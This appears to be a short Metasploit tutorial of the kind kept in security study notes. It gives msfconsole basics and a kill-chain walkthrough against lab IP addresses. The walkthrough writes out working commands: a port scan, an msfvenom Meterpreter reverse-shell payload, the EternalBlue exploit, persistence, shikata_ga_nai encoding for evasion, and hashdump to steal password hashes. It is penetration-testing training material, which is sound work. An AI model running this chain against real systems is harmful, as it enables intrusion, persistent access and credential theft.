## Workflow:
1. To start Metasploit shell: `msfconsole`

2. A shell will be open: `msf6` along with all available Modules.

3. Search a module to use `search type:keyword`
- to navigate to modules `back`

4. To interact with a module `info 23, use 23 or use auxiliary/scanner/portscan/tcp `

5. Once selected `auxiliary(scanner/portscan/tcp)`
In Case of `Exploit` Module, we can set a payload too.
- To check available payloads for current Exploit Module `show payload`
- Select a payload `set payload_name or Number`

6. Check Options `show options` or full info with `info`

7. Set the Parameters Lhost/Rhost/Ports etc `set Lhost x.x.x.x`

8. Run the module `run` or `exploit`

## Note: TO SAVE the Output:
```
spool /path/to/output_file.txt
run
spool off
```

---
---

# Practical Example Workflow:
## 1. Reconnaissance:
```
Load auxiliary module: use auxiliary/scanner/portscan/tcp
Set RHOSTS: set RHOSTS 192.168.1.100
Run the scan: run
```

## 2. Weaponization:
```
Generate payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o shell.exe
```

## 3. Delivery:
```
Load exploit module: use exploit/windows/smb/ms17_010_eternalblue
Set payload: set payload windows/meterpreter/reverse_tcp
Set RHOST: set RHOST 192.168.1.100
Run the exploit: run
```

## 4. Exploitation:
```
Meterpreter session opened (assuming successful exploitation).
```

## 5. Installation:
```
Load post-exploitation module: use post/windows/manage/persistence
Set session: set SESSION 1
Run the module: run
```

## 6. Command and Control (C2):
```
Encode payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded_shell.exe
```

## 7. Actions on Objectives:
```
Load post-exploitation module: use post/windows/gather/hashdump
Set session: set SESSION 1
Run the module: run
```

---
---

## Cheatsheet:
![image](https://github.com/IOxCyber/CyberEssentials/assets/40174034/7835180f-7295-4337-8f81-8bb23c35f14c)
